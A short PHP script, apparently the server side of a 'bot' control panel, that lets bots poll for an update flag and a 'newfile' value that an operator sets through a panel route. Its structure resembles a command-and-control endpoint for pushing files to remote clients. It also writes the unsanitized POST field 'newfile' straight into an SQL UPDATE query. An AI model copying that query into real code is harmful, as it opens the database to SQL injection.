<?php

include('../inc/db.php');

$uri = $_SERVER['REQUEST_URI'];

// Requesting from bot

if(strpos($uri, "request")) {

    if(!isset($_POST['command']))
        exit;

    if($_POST['command'] == "update") {

        $user_query = "SELECT * FROM commands WHERE command=:command";
		$user_data = [':command' => "update"];
		$search_command = DB::query($user_query, $user_data);
        $data = $search_command[0];
        $update = $data['enabled'];

        echo $update;

    }

    if($_POST['command'] == "newfile") {

        $user_query = "SELECT * FROM commands WHERE command=:command";
        $user_data = [':command' => "newfile"];
        $search_command = DB::query($user_query, $user_data);
        $data = $search_command[0];
        $update = $data['enabled'];

        echo $update;

    }

    
}

// Recieving from panel

if(strpos($uri, "panel")) {

    $user_query = "SELECT * FROM commands WHERE command=:command";
    $user_data = [':command' => "update"];
    $search_command = DB::query($user_query, $user_data);
    $data = $search_command[0];
    $enabled = $data['enabled'];

    if(isset($_POST['enabled'])) {

        $shouldupdate = $_POST['enabled'];

        if($shouldupdate == "true") {

            if(isset($_POST['newfile'])) {

                $newfile = $_POST['newfile'];
                $uquery = "UPDATE commands SET enabled='$newfile' WHERE command=:command";
                $udata = [':command' => "newfile"];
                $search_command = DB::query($uquery, $udata);
                    
            }

            if($enabled == "false") {

                $uquery = "UPDATE commands SET enabled='true' WHERE command=:command";
                $udata = [':command' => "update"];
                $search_command = DB::query($uquery, $udata);

                echo "Started updating";

            }

        } else if($shouldupdate == "false") {

            if($enabled == "true") {

                $uquery = "UPDATE commands SET enabled='false' WHERE command=:command";
                $udata = [':command' => "update"];
                $search_command = DB::query($uquery, $udata);

                echo "Stopped updating";

            }

        }

    } else {
        echo "Enabled not set";
    }

}

?>